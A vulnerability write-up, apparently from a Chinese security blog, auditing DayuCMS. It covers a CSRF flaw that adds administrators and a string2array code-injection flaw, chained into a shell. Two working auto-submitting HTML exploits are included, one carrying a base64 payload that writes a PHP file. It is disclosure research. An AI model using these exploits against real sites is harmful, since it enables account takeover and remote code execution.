@@ -1,0 +1,102 @@
+<h1 id="x00-">0x00 背景</h1>
+
+<p>下载链接：
+站长之家：<a href="http://down.chinaz.com/soft/34205.htm">http://down.chinaz.com/soft/34205.htm</a>
+官网：<a href="http://www.dayucms.com/show/?id=105&amp;page=1&amp;siteid=1">http://www.dayucms.com/show/?id=105&amp;page=1&amp;siteid=1</a></p>
+
+<p>首先是感觉代码加固过，可能被之前的白帽子审计过，审计完才发现JoyChou早已对1.526的版本撸过一遍了，具体见：<a href="http://www.joychou.org/index.php/web/dayucms-1-526-foreground-remote-code-execution.html">http://www.joychou.org/index.php/web/dayucms-1-526-foreground-remote-code-execution.html</a></p>
+
+<h1 id="x01-csrf">0x01 CSRF</h1>
+
+<p>初看源码时感觉IP是无法伪造的，XSS和SQL注入方面代码当中也有一些加固。想要找找短板，于是乎来到比较容易被忽略的CSRF。首先利用管理员账号登录后台，看看在一些表单提交处是否有hidden的token，在添加管理员处用burp抓包看看：</p>
+
+<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20170301/1.png" alt="" /></p>
+
+<p>的确是没有的，只有一些添加的管理员信息，再到对应的代码中看看，在dayucms.php的38行，是要对应包含admin/admin.inc.php文件：</p>
+
+<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20170301/2.png" alt="" /></p>
+
+<p>在admin.inc.php的开头并没有对referer进行验证就开始操作对应的action：</p>
+
+<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20170301/3.png" alt="" /></p>
+
+<p>于是一趟下来就很愉快：</p>
+
+<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20170301/4.png" alt="" /></p>
+
+<p>下面简单给个PoC代码</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;title&gt;</span>test<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;http://localhost/dayucms/dayucms.php?file=admin&amp;action=add&amp;roleid=1&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;do_submit&quot;</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;newadmin[roleid]&quot;</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;newadmin[username]&quot;</span> <span class="na">value=</span><span class="s">&quot;larry&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;newadmin[password]&quot;</span> <span class="na">value=</span><span class="s">&quot;larry&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;newadmin[category][]&quot;</span> <span class="na">value=</span><span class="s">&quot;0&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;newadmin[allowmultilogin]&quot;</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;newadmin[disabled]&quot;</span> <span class="na">value=</span><span class="s">&quot;0&quot;</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+
+    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+    <span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span></code></pre></div>
+
+<p>最后使用虚拟机搭建PoC来验证CSRF，结果可成功添加管理员：</p>
+
+<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20170301/5.png" alt="" /></p>
+
+<h1 id="x02-">0x02 代码执行</h1>
+
+<p>本来以为就存在个CSRF，不过再耐心看看也是定位到了global.func.php的string2array函数，很明显得存在代码注入可执行任意php代码：</p>
+
+<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20170301/6.png" alt="" /></p>
+
+<p>可是再一查找全局调用该函数的地方，可能由于代码之前被爆过一次漏洞，发现用到的php脚本都是和后台相关联的，也就是需要登录后台才可以利用：</p>
+
+<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20170301/7.png" alt="" /></p>
+
+<p>所以就定位到在gather.class.php中gather对象的import方法会$data<a href="http://ojyzyrhpd.bkt.clouddn.com/20170301/1.png">1</a>字段在base64解码后传入string2array函数：</p>
+
+<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20170301/8.png" alt="" /></p>
+
+<p>对应得在gather.inc.php文件中对规则的导入使用import这一action，进而可以造成代码注入执行：</p>
+
+<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20170301/9.png" alt="" /></p>
+
+<p>在后台导入规则处传入<code>larry-'larry';phpinfo()的base64</code>编码<code>bGFycnk=-J2xhcnJ5JztwaHBpbmZvKCk=</code>后（’-‘分割），即可执行php代码：</p>
+
+<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20170301/10.png" alt="" /></p>
+
+<h1 id="x03-">0x03 结合</h1>
+
+<p>后台执行代码太low怎么办，那就结合呀，正好利用CSRF就可以GetShell了，原理也是相同的，如图所示：</p>
+
+<p><img src="http://ojyzyrhpd.bkt.clouddn.com/20170301/11.png" alt="" /></p>
+
+<p>PoC代码如下：</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;title&gt;</span>test<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;http://192.168.1.103/dayucms/dayucms.php?mod=gather&amp;file=gather&amp;action=import&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;do_submit&quot;</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;importdata&quot;</span> <span class="na">value=</span><span class="s">&quot;bGFycnk=-MTtmcHV0cyhmb3BlbihiYXNlNjRfZGVjb2RlKCdiR0Z5Y25rdWNHaHcnKSwndycpLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFnY0dod2FXNW1ieWdwT3lBL1BnJykp&quot;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name=</span><span class="s">&quot;1&quot;</span> <span class="na">value=</span><span class="s">&quot;导入规则&quot;</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+
+    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+    <span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span></code></pre></div>
+
